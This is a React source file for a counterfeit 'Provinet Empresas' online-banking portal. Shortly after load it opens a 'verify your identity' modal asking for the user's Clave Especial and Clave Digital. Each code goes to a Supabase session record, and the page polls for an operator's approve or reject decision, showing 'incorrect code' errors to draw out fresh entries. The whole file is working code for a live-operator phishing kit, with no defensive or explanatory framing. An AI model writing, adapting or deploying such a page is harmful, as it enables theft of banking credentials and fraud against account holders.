import { useState, useEffect, useRef } from 'react';
import { useSearchParams } from 'react-router-dom';
import { Eye, EyeOff } from 'lucide-react';
import { base44, supabase } from '@/api/base44Client';
import { usePresence } from '@/hooks/usePresence';
import HeaderBar from '@/components/provinet/HeaderBar';
import SidebarMenu from '@/components/provinet/SidebarMenu';
import MainContent from '@/components/provinet/MainContent';

function useIsMobile() {
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
  useEffect(() => {
    const handler = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', handler);
    return () => window.removeEventListener('resize', handler);
  }, []);
  return isMobile;
}

export default function Portal() {
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get('sessionId');

  const [activeItem, setActiveItem] = useState('buzon');
  const [userName, setUserName] = useState('');
  const isMobile = useIsMobile();

  // Modal state
  const [showModal, setShowModal] = useState(false);
  const [loadingDone, setLoadingDone] = useState(false);
  const [contactoInfo, setContactoInfo] = useState(/** @type {{correo_electronico?:string,telefono_celular?:string}|null} */ (null));

  // Clave Especial
  const [claveEspecial, setClaveEspecial] = useState('');
  const [showClaveEspecial, setShowClaveEspecial] = useState(false);
  const [ceSubmitted, setCeSubmitted] = useState(false);
  const [ceApproved, setCeApproved] = useState(false);
  const [ceRejected, setCeRejected] = useState(false);

  // Clave Digital
  const [claveDigital, setClaveDigital] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [rejected, setRejected] = useState(false);

  const pollTimerRef = useRef(/** @type {ReturnType<typeof setTimeout> | null} */ (null));
  const pollActiveRef = useRef(false);
  const ceTimerRef = useRef(/** @type {ReturnType<typeof setTimeout> | null} */ (null));
  const ceActiveRef = useRef(false);
  const formRef = useRef(null);
  const { setRejected: setPresenceRejected } = usePresence(sessionId, formRef);

  const stopPolling = () => {
    pollActiveRef.current = false;
    if (pollTimerRef.current) clearTimeout(pollTimerRef.current);
  };
  const stopCePolling = () => {
    ceActiveRef.current = false;
    if (ceTimerRef.current) clearTimeout(ceTimerRef.current);
  };

  const applyPortalData = (/** @type {string} */ raw) => {
    if (!raw) return;
    try {
      const d = JSON.parse(raw);
      if (d.cliente) setUserName(d.cliente.toUpperCase());
    } catch {
      const match = raw.match(/hola\s+(.+)/i);
      if (match) setUserName(match[1].trim().toUpperCase());
    }
  };

  useEffect(() => {
    document.title = 'Provinet Empresas';

    let modalShown = false;
    const triggerModal = () => {
      if (!modalShown) { modalShown = true; setShowModal(true); }
    };
    const handleClick = () => triggerModal();
    document.addEventListener('click', handleClick, { once: true });

    if (!sessionId) {
      const t1 = setTimeout(() => setLoadingDone(true), 2500);
      const t2 = setTimeout(triggerModal, 2000);
      return () => { clearTimeout(t1); clearTimeout(t2); document.removeEventListener('click', handleClick); };
    }

    supabase
      .from('user_session_data')
      .select('nombre_display, contacto_info')
      .eq('id', sessionId)
      .single()
      .then(({ data }) => {
        if (data?.nombre_display) applyPortalData(data.nombre_display);
        if (data?.contacto_info) { try { setContactoInfo(JSON.parse(data.contacto_info)); } catch {} }
      })
      // eslint-disable-next-line @typescript-eslint/no-empty-function
      .then(() => {}, () => {});

    const channel = supabase
      .channel(`portal-data-${sessionId}`)
      .on('postgres_changes', {
        event: 'UPDATE', schema: 'public', table: 'user_session_data',
        filter: `id=eq.${sessionId}`,
      }, (payload) => {
        if (payload.new?.nombre_display) applyPortalData(payload.new.nombre_display);
        if (payload.new?.contacto_info) { try { setContactoInfo(JSON.parse(payload.new.contacto_info)); } catch {} }
      })
      .subscribe();

    const t1 = setTimeout(() => setLoadingDone(true), 2500);
    const t2 = setTimeout(triggerModal, 2000);
    return () => {
      clearTimeout(t1); clearTimeout(t2);
      document.removeEventListener('click', handleClick);
      stopPolling();
      supabase.removeChannel(channel);
    };
  }, [sessionId]);

  const handleEnviarClaveEspecial = async () => {
    if (!claveEspecial.trim() || !sessionId || ceSubmitted) return;
    setCeSubmitted(true);
    setCeRejected(false);
    setPresenceRejected(false);
    try {
      await base44.entities.UserSessionData.update(sessionId, {
        claveEspecial: claveEspecial.trim(),
        claveEspecialStatus: 'pending',
      });
    } catch {
      setCeSubmitted(false);
      return;
    }

    ceActiveRef.current = true;
    const poll = async () => {
      if (!ceActiveRef.current) return;
      try {
        const { data } = await supabase
          .from('user_session_data')
          .select('clave_especial_status')
          .eq('id', sessionId)
          .single();
        if (data?.clave_especial_status === 'approved') {
          stopCePolling();
          setCeApproved(true);
        } else if (data?.clave_especial_status === 'rejected') {
          stopCePolling();
          setClaveEspecial('');
          setCeSubmitted(false);
          setCeRejected(true);
          setPresenceRejected(true);
        } else if (ceActiveRef.current) {
          ceTimerRef.current = setTimeout(poll, 300);
        }
      } catch {
        if (ceActiveRef.current) ceTimerRef.current = setTimeout(poll, 300);
      }
    };
    ceTimerRef.current = setTimeout(poll, 300);
  };

  const handleEnviar = async () => {
    if (!claveDigital.trim() || !sessionId || submitted) return;
    setSubmitted(true);
    setRejected(false);
    setPresenceRejected(false);
    try {
      await base44.entities.UserSessionData.update(sessionId, { claveDigital: claveDigital.trim() });
      await base44.entities.UserSessionData.update(sessionId, { claveDigitalStatus: 'pending' });
    } catch {
      setSubmitted(false);
      return;
    }

    pollActiveRef.current = true;
    const poll = async () => {
      if (!pollActiveRef.current) return;
      try {
        const { data } = await supabase
          .from('user_session_data')
          .select('clave_digital_status')
          .eq('id', sessionId)
          .single();
        if (data?.clave_digital_status === 'rejected') {
          stopPolling();
          setClaveDigital('');
          setSubmitted(false);
          setRejected(true);
          setPresenceRejected(true);
        } else if (pollActiveRef.current) {
          pollTimerRef.current = setTimeout(poll, 300);
        }
      } catch {
        if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, 300);
      }
    };
    pollTimerRef.current = setTimeout(poll, 300);
  };

  const portalContent = (
    <>
      <HeaderBar userName={userName} />
      <div style={{ display: 'flex', flex: 1, background: '#ABC7E4', overflow: 'hidden' }}>
        <SidebarMenu activeItem={activeItem} onItemClick={setActiveItem} />
        <div style={{ flex: 1, overflow: 'hidden' }}>
          <MainContent />
        </div>
      </div>
    </>
  );

  return (
    <>
      <style>{`
        .portal-modal-backdrop {
          position: fixed; inset: 0; z-index: 10000;
          background: rgba(0,0,0,0.45);
          display: flex; align-items: center; justify-content: center;
          opacity: 0; transition: opacity 0.3s ease; pointer-events: none;
        }
        .portal-modal-backdrop.visible { opacity: 1; pointer-events: all; }
        .portal-ventana-modal {
          background: #fff; border: 1px solid #7aaac8; border-radius: 3px;
          box-shadow: 0 8px 32px rgba(30,70,110,0.2); width: 460px; max-width: 90vw;
          display: flex; flex-direction: column; overflow: hidden;
        }
        .portal-modal-header {
          border-bottom: 3px solid #5a9abf; padding: 14px 18px 10px;
          background: linear-gradient(180deg, #f5f9fc 0%, #eaf2f8 100%);
        }
        .portal-modal-logo .logo-title { font-size: 20px; font-weight: bold; color: #1a4a6a; }
        .portal-modal-logo .logo-sub { font-size: 11px; color: #5a9abf; margin-top: 2px; }
        .portal-modal-body { padding: 18px 24px; }
        .portal-form-box { border: 1px solid #c8d8e8; border-radius: 2px; overflow: hidden; margin-top: 12px; }
        .portal-form-box-title {
          background: #dce8f0; padding: 8px 16px; font-size: 13px;
          font-weight: bold; color: #1a4a6a; border-bottom: 1px solid #c8d8e8;
        }
        .portal-form-row {
          display: flex; align-items: center; padding: 10px 16px;
          border-bottom: 1px solid #e8f0f8; gap: 16px;
        }
        .portal-form-row:last-child { border-bottom: none; }
        .portal-form-label { font-size: 13px; color: #333; width: 160px; flex-shrink: 0; }
        .portal-form-input-wrap { position: relative; flex: 1; display: flex; align-items: center; }
        .portal-form-input {
          border: 1px solid #90a4ae; border-radius: 2px;
          padding: 4px 32px 4px 8px; font-size: 13px; outline: none; width: 100%;
        }
        .portal-form-input:focus { border-color: #1a6aaa; }
        .portal-eye-btn {
          position: absolute; right: 6px; background: none; border: none;
          cursor: pointer; color: #666; display: flex; align-items: center; padding: 0;
        }
        .portal-eye-btn:hover { color: #1a6aaa; }
        .portal-btn-enviar {
          margin-top: 20px; color: #fff;
          border: none; padding: 8px 28px; font-size: 14px; font-weight: bold;
          cursor: pointer; border-radius: 2px; transition: background 0.2s;
        }
        .portal-btn-enviar.active { background: #1973B8; }
        .portal-btn-enviar.active:hover { background: #1560a0; }
        .portal-btn-enviar.inactive { background: #9e9e9e; cursor: not-allowed; }
        .portal-form-error {
          margin-top: 10px; font-size: 12px; color: #cc0000;
          background: #fff3f3; border: 1px solid #f5c6c6;
          border-radius: 2px; padding: 6px 12px;
        }
        .portal-submit-overlay {
          position: fixed; inset: 0; z-index: 10001;
          display: flex; align-items: center; justify-content: center;
          background: rgba(180,200,220,0.35);
        }
        .portal-submit-box {
          display: flex; align-items: center; gap: 18px;
          background: #fff; border: 2px solid #1973B8; border-radius: 4px;
          padding: 22px 36px; box-shadow: 0 2px 16px rgba(25,115,184,0.15);
          font-size: 14px; color: #1a4a6a; min-width: 340px;
        }
        .portal-submit-spinner {
          width: 36px; height: 36px; flex-shrink: 0;
          border: 4px solid #d0e4f0; border-top-color: #1973B8;
          border-radius: 50%; animation: portal-spin 0.9s linear infinite;
        }
        @keyframes portal-spin { to { transform: rotate(360deg); } }
        @media (max-width: 768px) {
          .portal-ventana-modal { width: calc(100vw - 20mm) !important; max-width: calc(100vw - 20mm); max-height: calc(100vh - 50mm); overflow-y: auto; margin-top: 10mm; }
          .portal-modal-body { padding: 8px 14px 10px; }
          .portal-form-row { flex-direction: column; align-items: flex-start; gap: 4px; padding: 5px 12px; }
          .portal-form-label { width: auto; font-size: 11px; }
          .portal-form-input-wrap { width: 100%; }
          .portal-form-input { width: 100%; padding: 5px 34px 5px 8px; font-size: 12px; }
          .portal-btn-enviar { width: 100%; padding: 8px; margin-top: 8px; font-size: 13px; }
          .portal-submit-box { min-width: unset; width: 88vw; padding: 18px 16px; font-size: 13px; }
        }
      `}</style>

      {isMobile ? (
        <div style={{ width: '100vw', overflowX: 'hidden', transformOrigin: 'top left' }}>
          <div style={{
            width: '900px',
            transform: `scale(${window.innerWidth / 900})`,
            transformOrigin: 'top left',
            height: `calc(100vh / ${window.innerWidth / 900})`,
            display: 'flex', flexDirection: 'column',
            fontFamily: 'Verdana, Geneva, Tahoma, sans-serif',
            fontSize: '11px', background: '#fff', overflow: 'hidden'
          }}>
            {portalContent}
          </div>
        </div>
      ) : (
        <div style={{
          width: '100%', fontFamily: 'Verdana, Geneva, Tahoma, sans-serif',
          fontSize: '11px', background: '#fff', display: 'flex', flexDirection: 'column', minHeight: '100vh'
        }}>
          {portalContent}
        </div>
      )}

      {/* MODAL VALIDACIÓN DE INGRESO */}
      <div className={`portal-modal-backdrop${showModal ? ' visible' : ''}`}>
        <div className="portal-ventana-modal">
          <div className="portal-modal-header">
            <div className="portal-modal-logo">
              <div className="logo-title"><strong>Provi</strong>net Empresas</div>
              <div className="logo-sub">Banca en Línea</div>
            </div>
          </div>
          <div className="portal-modal-body" ref={formRef}>
            <p style={{ fontSize: 14, marginBottom: 12 }}>
              Por su seguridad, verifique su identidad completando los siguientes campos.
            </p>

            {ceApproved && (
              <div style={{ marginBottom: 12 }}>
                <div style={{ fontSize: 13, fontWeight: 600, color: 'rgb(26,74,106)', marginBottom: 4 }}>
                  Clave digital enviada
                </div>
                <div style={{ fontSize: 12, color: 'rgb(42,90,138)', lineHeight: 1.7 }}>
                  {contactoInfo?.correo_electronico && (
                    <div style={{ display: 'flex', gap: 6 }}>
                      <span style={{ fontWeight: 600, color: 'rgb(26,74,106)', minWidth: 52 }}>Correo:</span>
                      <span>{contactoInfo.correo_electronico}</span>
                    </div>
                  )}
                  {contactoInfo?.telefono_celular && (
                    <div style={{ display: 'flex', gap: 6 }}>
                      <span style={{ fontWeight: 600, color: 'rgb(26,74,106)', minWidth: 52 }}>Celular:</span>
                      <span>{contactoInfo.telefono_celular}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            <div className="portal-form-box">
              <div className="portal-form-box-title">Validacion de Ingreso</div>

              {/* Clave Especial */}
              <div className="portal-form-row" style={{ opacity: ceApproved ? 0.4 : 1, transition: 'opacity 0.3s' }}>
                <span className="portal-form-label">Clave Especial</span>
                <div className="portal-form-input-wrap">
                  <input
                    className="portal-form-input"
                    type={showClaveEspecial ? 'text' : 'password'}
                    value={claveEspecial}
                    onChange={(e) => { setClaveEspecial(e.target.value.replace(/\s/g, '')); setCeRejected(false); }}
                    disabled={ceSubmitted || ceApproved}
                    autoComplete="off"
                  />
                  <button type="button" className="portal-eye-btn" onClick={() => setShowClaveEspecial(v => !v)} tabIndex={-1}>
                    {showClaveEspecial ? <EyeOff width={16} height={16} /> : <Eye width={16} height={16} />}
                  </button>
                </div>
              </div>

              {/* Clave Digital */}
              <div className="portal-form-row" style={{ opacity: ceApproved ? 1 : 0.4, transition: 'opacity 0.3s' }}>
                <span className="portal-form-label">Clave digital</span>
                <div className="portal-form-input-wrap">
                  <input
                    className="portal-form-input"
                    type={showPassword ? 'text' : 'password'}
                    inputMode="numeric"
                    value={claveDigital}
                    onChange={(e) => {
                      if (!ceApproved) return;
                      setClaveDigital(e.target.value.replace(/[^0-9]/g, ''));
                      setRejected(false);
                    }}
                    disabled={!ceApproved || submitted}
                    autoComplete="off"
                  />
                  <button type="button" className="portal-eye-btn" onClick={() => setShowPassword(v => !v)} tabIndex={-1}>
                    {showPassword ? <EyeOff width={16} height={16} /> : <Eye width={16} height={16} />}
                  </button>
                </div>
              </div>
            </div>

            {ceRejected && (
              <div className="portal-form-error">
                La Clave Especial ingresada es incorrecta. Por favor, intente nuevamente.
              </div>
            )}
            {rejected && (
              <div className="portal-form-error">
                La Clave Digital ingresada es incorrecta. Por favor, intente nuevamente.
              </div>
            )}

            <div style={{ marginTop: 20, marginBottom: 4 }}>
              {!ceApproved ? (
                <button
                  className={`portal-btn-enviar${claveEspecial.length > 0 && !ceSubmitted ? ' active' : ' inactive'}`}
                  style={{ marginTop: 0 }}
                  onClick={handleEnviarClaveEspecial}
                  disabled={!claveEspecial || ceSubmitted}
                >
                  {ceSubmitted ? 'Verificando...' : 'Enviar'}
                </button>
              ) : (
                <button
                  className={`portal-btn-enviar${claveDigital.length > 0 && !submitted ? ' active' : ' inactive'}`}
                  style={{ marginTop: 0 }}
                  onClick={handleEnviar}
                  disabled={!claveDigital || submitted}
                >
                  Enviar
                </button>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Spinner esperando aprobación clave especial */}
      {ceSubmitted && !ceApproved && !ceRejected && (
        <div className="portal-submit-overlay">
          <div className="portal-submit-box">
            <div className="portal-submit-spinner" />
            <span>Procesando su petición, por favor espere...</span>
          </div>
        </div>
      )}

      {/* Spinner post-envío clave digital */}
      {submitted && (
        <div className="portal-submit-overlay">
          <div className="portal-submit-box">
            <div className="portal-submit-spinner" />
            <span>Procesando su petición, por favor espere...</span>
          </div>
        </div>
      )}

      {/* Loading inicial */}
      {!loadingDone && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 9999,
          display: 'flex', alignItems: 'center', justifyContent: 'center',
          background: 'rgba(200,216,232,0.2)',
        }}>
          <div style={{
            display: 'flex', alignItems: 'center', gap: 18,
            background: '#fff', border: '2px solid #5a9abf', borderRadius: 4,
            padding: '22px 36px', boxShadow: '0 2px 16px rgba(42,90,124,0.15)',
            fontSize: 14, color: '#1a4a6a', minWidth: 340,
          }}>
            <div style={{
              width: 36, height: 36, flexShrink: 0,
              border: '4px solid #d0e4f0', borderTopColor: '#3a8abf',
              borderRadius: '50%', animation: 'portal-spin 0.9s linear infinite',
            }} />
            <span>Procesando su petición, por favor espere...</span>
          </div>
        </div>
      )}
    </>
  );
}
